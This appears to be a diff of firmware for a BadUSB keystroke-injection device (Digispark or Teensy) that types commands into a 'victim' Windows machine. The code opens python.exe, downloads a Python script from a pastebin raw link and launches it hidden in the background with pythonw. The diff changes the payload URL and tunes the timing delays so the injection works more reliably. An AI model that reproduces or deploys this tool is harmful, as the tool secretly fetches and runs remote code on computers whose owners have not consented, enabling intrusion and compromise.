@@ -25,15 +25,15 @@ SOFTWARE.
 ============================================================================*/
 
 /* SETTINGS */
-#define PY_SCRIPT_URL "https://pastebin.com/raw/JMVWuNc5" // Raw text link to python script to run in background on "victim"
+#define PY_SCRIPT_URL "https://pastebin.com/raw/BY9xEaJi" // Raw text link to python script to run in background on "victim"
 #define PY_SCRIPT_NAME "pyscr.py" // Name of script that is saved on "victim"'s user directory
 
 //#define TEENSY // Uncomment if programming a teensy
 
-#define START_DELAY 1200
-#define START_MENU_DELAY 600
-#define START_MENU_SEARCH_DELAY 150
-#define PYTHON_WINDOW_OPEN_DELAY 600
+#define START_DELAY 1600
+#define START_MENU_DELAY 800
+#define START_MENU_SEARCH_DELAY 350
+#define PYTHON_WINDOW_OPEN_DELAY 1300
 
 #ifndef TEENSY
   #include "DigiKeyboard.h"
@@ -61,6 +61,7 @@ namespace kbd {
   void pressModKey(int key) {
     #ifdef TEENSY
       Keyboard.press(key);
+      kbd::wait(5);
       Keyboard.release(key);
     #else
       DigiKeyboard.sendKeyStroke(0, key);
@@ -69,6 +70,7 @@ namespace kbd {
   void pressKey(int key) {
     #ifdef TEENSY
       Keyboard.press(key);
+      kbd::wait(5);
       Keyboard.release(key);
     #else
       DigiKeyboard.sendKeyStroke(key);
@@ -81,6 +83,8 @@ namespace kbd {
 void setup() {
   /*   Open python prompt   */
   kbd::wait(START_DELAY);
+  kbd::print("");
+  kbd::wait(10); 
   kbd::pressModKey(KEY_LEFT_GUI);
   kbd::wait(START_MENU_DELAY);
   kbd::print("python.exe");
@@ -97,4 +101,11 @@ void setup() {
          "f.close();"
          "subprocess.Popen('pythonw.exe "});kbd::print(PY_SCRIPT_NAME);kbd::print({"',creationflags=8,close_fds=True);exit()"}); // Open the script we just made with pythonw (so it runs in background)
   kbd::pressKey(KEY_ENTER);
-}void loop() {}
+}
+
+
+void loop() {
+#ifdef TEENSY
+  //kbd::pressKey(KEY_MEDIA_VOLUME_INC); //Spam volume up
+#endif
+}
